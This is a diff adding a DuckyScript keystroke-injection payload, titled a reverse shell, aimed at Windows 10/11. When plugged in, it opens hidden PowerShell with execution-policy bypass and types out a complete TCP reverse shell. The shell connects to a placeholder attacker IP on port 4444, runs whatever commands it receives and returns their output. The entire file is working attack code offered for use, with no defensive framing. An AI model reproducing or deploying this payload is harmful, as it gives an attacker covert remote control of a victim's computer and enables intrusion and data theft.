@@ -1,0 +1,62 @@
+REM ###############################################
+REM #                                             |
+REM # Title        : NullSec Reverse Shell        |
+REM # Author       : bad-antics                   |
+REM # Version      : 1.0                          |
+REM # Category     : Remote Access                |
+REM # Target       : Windows 10/11                |
+REM #                                             |
+REM ###############################################
+
+REM Requirements:
+REM     - Windows 10/11
+REM     - Network access to attacker
+REM     - Listener running on attacker machine
+
+REM IMPORTANT: Set your listener IP and PORT
+DEFINE ATTACKER_IP 192.168.1.100
+DEFINE ATTACKER_PORT 4444
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+
+REM PowerShell reverse shell
+STRING $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",ATTACKER_PORT);
+ENTER
+DELAY 200
+STRING $stream = $client.GetStream();
+ENTER
+DELAY 200
+STRING [byte[]]$bytes = 0..65535|%{0};
+ENTER
+DELAY 200
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+ENTER
+DELAY 200
+STRING     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+ENTER
+DELAY 200
+STRING     $sendback = (iex $data 2>&1 | Out-String );
+ENTER
+DELAY 200
+STRING     $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+ENTER
+DELAY 200
+STRING     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+ENTER
+DELAY 200
+STRING     $stream.Write($sendbyte,0,$sendbyte.Length);
+ENTER
+DELAY 200
+STRING     $stream.Flush()
+ENTER
+DELAY 200
+STRING }
+ENTER
+DELAY 200
+STRING $client.Close()
+ENTER
